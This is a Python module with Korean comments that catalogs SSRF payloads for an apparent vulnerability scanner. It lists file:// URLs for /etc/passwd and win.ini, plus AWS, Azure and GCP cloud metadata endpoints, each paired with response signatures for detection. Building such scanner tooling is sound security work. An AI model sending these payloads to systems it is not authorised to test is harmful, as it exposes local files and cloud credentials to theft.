"""SSRF 페이로드 카탈로그.

탐지 방식: 서버가 페이로드 URL을 실제로 요청한 뒤 응답 본문을 클라이언트에 반환하면
시그니처 매칭으로 확인한다.

구성:
- file:// 스킴: 로컬 파일 직접 회수
- 클라우드 메타데이터: AWS / Azure / GCP 링크-로컬 엔드포인트
"""
from __future__ import annotations

from dataclasses import dataclass

from attacker_module_3.common.result import Confidence


@dataclass(frozen=True)
class SSRFPayload:
    value: str
    category: str
    signatures: tuple[bytes, ...]
    confidence: Confidence


PAYLOADS: tuple[SSRFPayload, ...] = (

    # ── file:// 스킴 ──────────────────────────────────────────────────────────
    SSRFPayload(
        value="file:///etc/passwd",
        category="scheme-file-nix",
        signatures=(b"root:x:0:0",),
        confidence=Confidence.HIGH,
    ),
    SSRFPayload(
        value="file:///c:/windows/win.ini",
        category="scheme-file-windows",
        signatures=(b"[fonts]", b"[extensions]"),
        confidence=Confidence.HIGH,
    ),

    # ── AWS EC2 인스턴스 메타데이터 ───────────────────────────────────────────
    # 헤더 없이도 응답하며 ami-id 등 고유 항목이 본문에 노출됨
    SSRFPayload(
        value="http://169.254.169.254/latest/meta-data/",
        category="http-aws-metadata",
        signatures=(b"ami-id", b"instance-id", b"local-ipv4"),
        confidence=Confidence.HIGH,
    ),
    # IMDSv2 전환 이후 일부 환경에서 사용하는 IPv6 링크-로컬 주소
    SSRFPayload(
        value="http://[fd00:ec2::254]/latest/meta-data/",
        category="http-aws-metadata-ipv6",
        signatures=(b"ami-id", b"instance-id"),
        confidence=Confidence.HIGH,
    ),

    # ── Azure IMDS ───────────────────────────────────────────────────────────
    # Metadata: true 헤더 없이 요청하면 에러 본문에 고유 키워드 포함
    SSRFPayload(
        value="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        category="http-azure-metadata",
        signatures=(b"osType", b"vmSize", b"Required metadata header"),
        confidence=Confidence.MEDIUM,
    ),

    # ── GCP 인스턴스 메타데이터 ──────────────────────────────────────────────
    # Metadata-Flavor: Google 헤더 없이 요청하면 에러 메시지에 헤더명 노출
    SSRFPayload(
        value="http://metadata.google.internal/computeMetadata/v1/",
        category="http-gcp-metadata",
        signatures=(b"Metadata-Flavor", b"computeMetadata"),
        confidence=Confidence.MEDIUM,
    ),
)
